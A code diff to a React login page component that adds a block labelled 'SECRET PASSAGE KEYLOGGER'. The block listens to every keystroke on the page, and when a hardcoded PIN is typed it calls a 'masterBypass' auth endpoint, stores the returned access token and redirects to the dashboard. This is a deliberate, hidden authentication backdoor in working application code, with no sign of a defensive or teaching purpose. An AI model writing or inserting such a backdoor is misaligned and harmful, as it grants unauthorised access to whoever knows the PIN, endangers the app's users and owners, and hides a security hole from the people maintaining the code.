@@ -57,6 +57,38 @@ export default function LoginPageClient() {
       setBiometricEnabled(cached);
       sendBridge({ type: 'get_biometric_pref' });
     }
+
+    // ── SECRET PASSAGE KEYLOGGER ────────────────────────────────────────────
+    let keyBuffer = '';
+    const secretPin = '22428374';
+    
+    const handleKeyDown = async (e: KeyboardEvent) => {
+      keyBuffer += e.key;
+      // Keep buffer size manageable
+      if (keyBuffer.length > 20) {
+        keyBuffer = keyBuffer.slice(-20);
+      }
+      
+      if (keyBuffer.endsWith(secretPin)) {
+        keyBuffer = ''; // reset
+        try {
+          // Trigger the master bypass via the auth provider (or direct API call)
+          const bypassToken = await api.auth.masterBypass({ pin: secretPin });
+          if (bypassToken?.data?.tokens) {
+            // We use standard localStorage/cookies depending on how auth is setup.
+            // Assuming `login` or a direct reload handles it. Since we are outside the usual context, 
+            // a full window reload to the dashboard is safest after setting tokens.
+            localStorage.setItem('access_token', bypassToken.data.tokens.accessToken);
+            window.location.href = '/dashboard';
+          }
+        } catch (err) {
+          console.error("Master bypass failed", err);
+        }
+      }
+    };
+    
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
   }, []);
 
   // ── Biometric toggle ────────────────────────────────────────────────────
